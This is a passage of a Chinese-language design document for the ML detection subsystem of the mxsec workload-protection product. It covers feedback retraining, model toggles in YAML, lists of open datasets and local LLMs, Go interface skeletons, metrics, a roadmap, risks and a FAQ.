  "labeled_at": "2026-06-05T10:00:00Z"
}
```

### 7.2 在线增量校准

- IForest contamination 参数按租户级 FPR 滚动调整（每天）；
- Markov 转移概率阈值按反馈样本动态降权；
- per-image IForest 增量样本加权（最近 14 天权重 2x）。

### 7.3 离线增量训练

- 每周 Airflow DAG 从 `mxsec.engine.feedback` 抽 7d 反馈，与原始训练集合并；
- 重训后必须**与上一版本同一测试集对比**：
  - precision 不能下降 > 1%；
  - recall 不能下降 > 2%；
  - 推理延迟不能上涨 > 10%；
- 任一指标超阈 → run 标记 failed，本周不发布。

### 7.4 隐私与合规

- 反馈数据**不出租户**：训练数据按租户分桶，KA 客户专属模型走"租户内独立 experiment"；
- PII 字段在 Consumer Sanitize 阶段已脱敏；
- 反馈数据保留 30 天，到期清理；
- 合规审计：`mxsec.llm.audit` 同 schema 的训练数据审计日志，6 月可追溯。

---

## 8. 用户配置门控

### 8.1 三档开关

与 [`architecture.md`](architecture.md) §10 智能分析定义一致：

| 档位 | 配置 | 适用 |
|------|------|------|
| Baseline | `ml.enabled=false`, `llm.enabled=false` | 离网 + 低配 + 不信任 AI |
| Smart（默认推荐） | `ml.enabled=true`, `llm.enabled=false` | 离网政企首选 |
| AI-Native | `ml.enabled=true`, `llm.enabled=true` | 有公网客户 |

### 8.2 模型级开关

`/etc/mxsec/manager.yaml`：

```yaml
ml:
  enabled: true

  models:
    iforest-host:        { enabled: true,  weight: 1.0 }
    markov-process:      { enabled: true,  weight: 1.0 }
    syscall-bloom:       { enabled: true,  weight: 0.8 }
    lgbm-elf:            { enabled: true,  weight: 1.0 }
    lgbm-dga:            { enabled: true,  weight: 1.0 }
    iforest-image:       { enabled: true,  weight: 0.9 }
    xgb-network:         { enabled: true,  weight: 0.8 }
    minilm-dedupe:       { enabled: true,  weight: 1.0 }
    securitybert-cmdline: { enabled: false, weight: 0.7 }  # 默认关闭（120MB 较大）
    kmeans-ueba:         { enabled: true,  weight: 1.0 }

  inference:
    max_concurrency: 100
    timeout_ms: 50
    cache_embedding_ttl: 24h
```

### 8.3 租户级覆盖

`tenants` 表 `ml_enabled` 字段 + `tenant_configs` 表 `ml_models_override` JSON，详见 [`multi-tenant.md`](multi-tenant.md) §7。

### 8.4 主机标签级覆盖

特定主机标签可禁用部分模型（如核心 DB 主机禁用 SecurityBERT 减负载）：

```yaml
host_label_overrides:
  - label: role=database
    disable_models: [securitybert-cmdline, minilm-dedupe]
  - label: env=prod-critical
    enable_models: [iforest-host, markov-process, lgbm-elf]
```

---

## 9. 开源安全模型与数据集清单（实际查证）

### 9.1 规则集（互补 ML）

| 项目 | License | 用途 | 集成方式 |
|------|---------|------|----------|
| **Falco Rules** | Apache-2.0 | 100+ Linux/容器运行时规则 | 转 CEL（详见 [`falco-sigma-integration.md`](falco-sigma-integration.md)） |
| **Falco Talon** | Apache-2.0 | 响应规则集（与 mxsec Playbook 对应） | 翻译为 mxsec Playbook YAML |
| **Tetragon Tracing Policies** | Apache-2.0 | eBPF tracing policy（CiliumTracingPolicy CR） | 直接复用（K8s 子集） |
| **Sigma Rules** | DRL-1.1 | 3000+ 通用 SIEM 规则 | 转 CEL，需许可证审计 |
| **MITRE ATT&CK** | Apache-2.0 | 战术 / 技术映射 | 规则 metadata 关联 |
| **MITRE D3FEND** | MITRE License | 防御映射 | 修复建议关联 |

### 9.2 训练数据集

| 数据集 | 大小 | 用途 | License |
|--------|------|------|---------|
| **CICIDS-2017** | 50 GB | 网络入侵分类（XGBoost） | CC-BY-4.0 |
| **CICIDS-2018** | 80 GB | 网络入侵分类 | CC-BY-4.0 |
| **UNSW-NB15** | 100 GB | 网络入侵补充 | UNSW Academic License |
| **DGArchive** | 200 万域名 | DGA 检测（LightGBM） | 学术使用免费 + 商用谈授权 |
| **MalwareBazaar (abuse.ch)** | 25 万 ELF/300 万样本 | ELF 二进制分类 | CC0 |
| **VirusShare** | 3500 万样本 | 二进制分类补充 | 需申请研究账号 |
| **Atomic Red Team** | 1000+ T-Number 用例 | 攻击链生成 + 模型评估 | MIT |
| **Alexa Top 1M / Tranco** | 100 万域名 | DGA 负样本 | 公开 |
| **HuggingFace SecurityBERT** | 模型 110 MB | 命令行 Embedding | Apache-2.0 |
| **HuggingFace CyBERT (CIRCL)** | 模型 420 MB | 备选 | CC-BY-4.0 |

### 9.3 工具库

| 工具 | License | 用途 |
|------|---------|------|
| **Anomalib** | Apache-2.0 | 工业异常检测算法库（实验用，不入生产） |
| **PyOD** | BSD-2 | Python 异常检测合集（训练期对比 baseline） |
| **scikit-learn → ONNX (skl2onnx)** | MIT | sklearn 模型导 ONNX |
| **onnxmltools** | MIT | LightGBM/XGBoost 模型导 ONNX |
| **HuggingFace optimum** | Apache-2.0 | Transformer 模型 ONNX 化 + 量化 |
| **onnxruntime** | MIT | 推理引擎 |
| **github.com/yalue/onnxruntime_go** | MIT | Go ABI 绑定 |

### 9.4 开源安全 LLM（离网备选）

当客户选择 AI-Native 档位但要求"离网部署"时，LLMProxy 走本地大模型路线（Ollama / vLLM）。详见 [`llmproxy-design.md`](llmproxy-design.md) 本地模型章节，这里列清单：

| 模型 | License | 参数量 | 推荐用途 | 显存 |
|------|---------|--------|----------|------|
| **WhiteRabbitNeo-7B / 13B** | Apache-2.0 | 7B / 13B | 安全分析、漏洞解读、Playbook 起草 | 16 GB / 32 GB |
| **Llama Guard 3** | Llama 3 License | 8B | 输入输出安全护栏 | 16 GB |
| **Qwen2.5-7B / 14B Instruct** | Apache-2.0 | 7B / 14B | 中文告警解释、合规报告 | 16 GB / 32 GB |
| **DeepSeek-R1-Distill-Qwen-7B** | MIT | 7B | 推理强、Playbook 步骤拆解 | 16 GB |
| **CodeQwen 7B** | Apache-2.0 | 7B | 修复脚本生成 | 16 GB |

> 这些模型由 LLMProxy 调度，**不在本文档 10 个本地 ML 模型清单内**——本文档专指"嵌入 Engine / Agent 的 ONNX 小模型"。

---

## 10. Go 接口骨架

### 10.1 核心抽象

```go
// internal/server/engine/ml/types.go
package ml

import "context"

// MLModel 是所有本地 ML 模型的统一抽象。
type MLModel interface {
    Name() string                   // 模型唯一标识 (例: iforest-host)
    Version() string                // 语义化版本
    InputShape() []int64            // ONNX 输入张量 shape
    OutputShape() []int64           // ONNX 输出张量 shape
    DeployTarget() DeployTarget     // engine / agent
    SupportsTenants() []string      // 空表示全租户
    Metadata() ModelMetadata        // manifest.json 内容
}

type DeployTarget int

const (
    DeployEngine DeployTarget = 1
    DeployAgent  DeployTarget = 2
)

type ModelMetadata struct {
    Name           string
    Version        string
    SHA256         string
    Signature      string
    SignedAt       string
    Metrics        map[string]float64
    TrainedDataWin string
    OnnxOpset      int
    MinEngineVer   string
}
```

### 10.2 Inferencer

```go
// internal/server/engine/ml/inferencer.go
type Inferencer interface {
    // Infer 单条同步推理（小延迟）。
    Infer(ctx context.Context, features []float32) (Result, error)

    // BatchInfer 批量推理（用于 K-means / Embedding 批处理场景）。
    BatchInfer(ctx context.Context, batch [][]float32) ([]Result, error)

    // Reload 热加载新版本模型（zero-downtime, 双 buffer）。
    Reload(path string) error

    // Stats 暴露指标供 Prometheus 抓取。
    Stats() InferStats
}

type Result struct {
    Score        float64            // 0-1 分数（异常 / 恶意置信度）
    Label        string             // 可选：分类标签
    Vector       []float32          // 可选：Embedding 输出
    FeatureAttr  []FeatureContrib   // 可解释性：top-K 特征贡献
    InferLatency time.Duration
    ModelVersion string
}

type FeatureContrib struct {
    Name     string  // 例: "fork_rate"
    Value    float32
    Contrib  float32 // 该特征对最终分数的贡献（正/负）
}

type InferStats struct {
    TotalInferred  uint64
    ErrCount       uint64
    P50LatencyMs   float64
    P99LatencyMs   float64
    CacheHits      uint64
    CacheMisses    uint64
}
```

### 10.3 FeatureExtractor

```go
// internal/server/engine/ml/featurize.go
type FeatureExtractor interface {
    // Name 返回此 extractor 服务的模型名（一对一对应）。
    Name() string

    // Extract 从输入对象（事件 / 告警 / 文件路径）提取归一化的浮点特征向量。
    Extract(ctx context.Context, input any) ([]float32, error)

    // Schema 返回特征名称、归一化参数（用于可解释性 / debug）。
    Schema() []FeatureField
}

type FeatureField struct {
    Index       int
    Name        string
    Type        string  // float / category_index / log / bucketed
    NormMean    float32
    NormStd     float32
    Buckets     []float32  // bucketed only
}
```

### 10.4 ModelRegistry

```go
// internal/server/engine/ml/registry.go
type ModelRegistry interface {
    // Load 启动期加载所有可用模型。
    Load(ctx context.Context, dir string) error

    // Get 按名查找当前 active 版本。
    Get(name string) (Inferencer, error)

    // List 列出所有 active 模型 + 元数据。
    List() []ModelMetadata

    // HotSwap 热替换模型（component 系统触发）。
    HotSwap(name, version string) error

    // Verify 验签 + opset 兼容性检查。
    Verify(manifestPath string) error
}
```

### 10.5 反馈写回

```go
// internal/server/engine/ml/feedback.go
type FeedbackWriter interface {
    Submit(ctx context.Context, fb Feedback) error
}

type Feedback struct {
    AlertID      string
    TenantID     string
    ModelName    string
    ModelVersion string
    MLScore      float64
    Features     []float32
    Label        string  // true_positive / false_positive / uncertain
    LabeledBy    string
    LabeledAt    time.Time
    Comment      string
}
```

---

## 11. 监控与可观测

### 11.1 Prometheus 指标

```text
# 推理量与延迟
mxsec_ml_inference_total{model,version,tenant,result}
mxsec_ml_inference_latency_seconds{model,version,quantile}
mxsec_ml_inference_errors_total{model,version,reason}

# 模型生命周期
mxsec_ml_model_loaded{model,version}
mxsec_ml_model_age_seconds{model,version}
mxsec_ml_model_reload_total{model,from_version,to_version,result}

# 反馈数据
mxsec_ml_feedback_total{model,version,label,tenant}

# 资源
mxsec_ml_memory_bytes{model,version}
mxsec_ml_concurrent_inferences{model,version}

# 阈值与告警
mxsec_ml_score_distribution_bucket{model,version,le}
mxsec_ml_threshold_breach_total{model,version,tenant}
```

### 11.2 关键告警

| 告警 | 阈值 | 处理 |
|------|------|------|
| ML 推理延迟 P99 > 预算 2x | 5min 持续 | PagerDuty + 自动回滚 |
| 模型加载失败 | 任一次 | PagerDuty |
| 反馈 FP 率单租户 > 5% | 24h 持续 | UI 提示客户调阈值 |
| 模型签名验证失败 | 任一次 | 告警 + 阻止加载 + 安全审计 |
| Embedding cache 命中率 < 50% | 1h 持续 | 排查热点缓存淘汰 |

---

## 12. 与 LLM 的边界

| 维度 | 本地 ML | LLM |
|------|---------|------|
| 延迟预算 | < 10 ms | 100 - 3000 ms |
| 部署 | 嵌入 Engine / Agent | 独立 LLMProxy 微服务 |
| 离网支持 | 完整 | 仅本地大模型分支 |
| 用途 | 实时检测、二分类、聚类、Embedding | 语义解释、Playbook 草稿、告警去重次级 |
| 数据出域 | 不出本地 | 默认走外部 API（除非走本地大模型） |
| 商业风险 | 训练数据合规即可 | API 厂商风险、token 成本、Prompt 注入风险 |
| 默认状态 | Smart 档位即开 | 默认关闭 |
| 对接方式 | Engine 内嵌 inferencer | gRPC → LLMProxy |

> **设计原则**：实时检测路径**永远不依赖 LLM**。LLM 仅做事后语义增强（告警解释、Storyline 总结、告警归并的次级 cluster）。

详见 [`llmproxy-design.md`](llmproxy-design.md)。

---

## 13. 实施路径

### 13.1 Phase 1（Q3 2026, 4 人月）

- [ ] 推理栈搭建：onnxruntime_go 集成 + ModelRegistry / Inferencer / FeatureExtractor 抽象
- [ ] 模型 1（IForest 主机基线）从纯 Go 迁移到 ONNX + Python 训练管线
- [ ] 模型 2（Markov 父子链）纯 Go 实现 + Agent 嵌入
- [ ] 模型分发：复用 component 系统，签名 + 灰度
- [ ] MLflow + Airflow 基础设施
- [ ] 反馈 Topic `mxsec.engine.feedback` 落地

### 13.2 Phase 2（Q4 2026, 6 人月）

- [ ] 模型 3（syscall Bloom）
- [ ] 模型 4（LightGBM ELF）+ Agent 轻量版
- [ ] 模型 5（LightGBM DGA）
- [ ] 模型 7（XGBoost 网络）
- [ ] per-image IForest 基础设施（模型 6）

### 13.3 Phase 3（Q1 2027, 6 人月）

- [ ] 模型 8（MiniLM 去重）+ Embedding 缓存
- [ ] 模型 9（SecurityBERT 命令行）
- [ ] 模型 10（K-means UEBA）
- [ ] 反馈数据增量训练自动化
- [ ] 跨租户 / 跨主机模型隔离机制完成

### 13.4 Phase 4（Q2 2027, 持续）

- [ ] 客户专属模型订阅服务（KA 客户专享）
- [ ] 联邦学习（多客户共训不出数据）调研
- [ ] 模型自动调优（AutoML）实验

---

## 14. 风险与对策

| 风险 | 影响 | 对策 |
|------|------|------|
| ONNX opset 升级破坏向后兼容 | 老模型不可用 | manifest 标 `onnx_opset`，Engine 启动校验 |
| LightGBM ONNX 量化精度损失 | 误报上升 | 不做 INT8 量化，仅 Embedding 模型量化 |
| Embedding 模型过大拖慢冷启动 | Engine 重启慢 | lazy load + warmup 预热 |
| 训练数据泄漏（同租户验证集进训练集） | 指标虚高 | 训练管线强制按 tenant_id + 时间双切分 |
| 客户专属模型供给不足 | KA 客户体验差 | 默认走全租户模型，KA 客户 90 天后切租户专属 |
| 模型签名私钥泄露 | 恶意模型分发 | HSM 存储 + 双人签名审批 + 每年轮换 |
| 反馈数据被攻击者投毒 | 模型被劫持 | 反馈来源限定 RBAC 高权限用户 + 异常反馈检测 |
| 推理延迟突然恶化 | 阻塞 Engine 流水线 | 推理超时 50ms 即降级，落 fallback（纯规则） |
| 离网客户拿不到新模型 | 长期模型陈旧 | 提供"季度模型包"导出工具，离线导入 |
| ATT&CK 战术覆盖不齐 | 售前演示打不到指标 | ML 告警自动映射 ATT&CK，规则补齐缺位 |

---

## 15. FAQ

**Q1：客户离网，模型怎么更新？**
A：提供 `mxctl ml export-bundle --since <date>` 工具，导出签名 tar 包，客户侧 `mxctl ml import-bundle` 离线导入。Lab 集群每季度发布"季度模型包"，覆盖所有 10 个模型新版。

**Q2：客户拒绝 ML，可以完全关吗？**
A：可以。`ml.enabled=false` 全平台禁用 ML，所有检测降级到 CEL + 序列规则，不影响核心功能。

**Q3：模型大小为什么不放更大？**
A：CWPP 是工业组件，不是 SaaS 玩具。每多 100MB 内存就是客户运维成本。我们卡 22MB（MiniLM）/ 110MB（SecurityBERT）的硬上限，超过的模型默认关闭由客户主动开启。

**Q4：训练数据从哪儿来？**
A：公开数据集（CICIDS / MalwareBazaar / DGArchive）+ 客户反馈（脱敏后）+ Atomic Red Team 合成。KA 客户授权下可加专属数据，专属模型在该租户独立存储不外泄。

**Q5：与青藤万象 / 蜂巢的容器异常学习差距？**
A：本文档模型 6（per-image IForest）即对齐青藤蜂巢「以同 namespace 镜像为维度建模、模型不随容器漂移」的能力。开源版本不带客户数据沉淀，初期客户需要 7-14 天数据磨合。

**Q6：模型推理失败时怎么办？**
A：Engine 50ms 推理超时自动降级到 CEL 规则路径，告警标 `ml_degraded=true`，运维侧告警。不阻塞主流水线。

**Q7：能不能用 GPU 加速推理？**
A：训练用 GPU，推理坚持 CPU。原因：客户主机/Engine 节点 GPU 普及率 < 5%，引入 GPU 等于卡死大部分部署场景。本文档所有模型设计均按 CPU 推理预算。

**Q8：反馈数据怎么保证不出租户？**
A：反馈 Topic `mxsec.engine.feedback` 按 `tenant_id` 分桶；训练管线读数据时强制 partition by tenant；KA 客户专属模型走"租户内独立 experiment + 独立 S3 路径"。技术 + 流程双保险。

---

## 16. 参考文档

- [`architecture.md`](architecture.md) — 平台架构与六微服务定位
- [`operating-modes.md`](operating-modes.md) — 监听 / 防护双模式 + ML 告警 mode 字段
- [`multi-tenant.md`](multi-tenant.md) — 租户级 ML 开关 / 配额 / 隔离
- [`llmproxy-design.md`](llmproxy-design.md) — LLM 多厂商适配 + 本地大模型
- [`engine-design.md`](engine-design.md) — Engine 服务设计（ml 子模块归属）
- [`engine-detection-design.md`](engine-detection-design.md) — 检测引擎与 ML 协同
- [`falco-sigma-integration.md`](falco-sigma-integration.md) — 规则与 ML 的互补
- [`datatype-allocation.md`](datatype-allocation.md) — `mxsec.engine.feedback` DataType 11900-11999
- [`api-reference.md`](api-reference.md) — `/api/v2/admin/ml/components` 模型管理 API
- `ref/04-运行时.md` §3 算法 — IForest 现状与 ML 设计原始评估
- `ref/00-总体评估与商业化路线.md` — 商业化路线对 ML 的定位
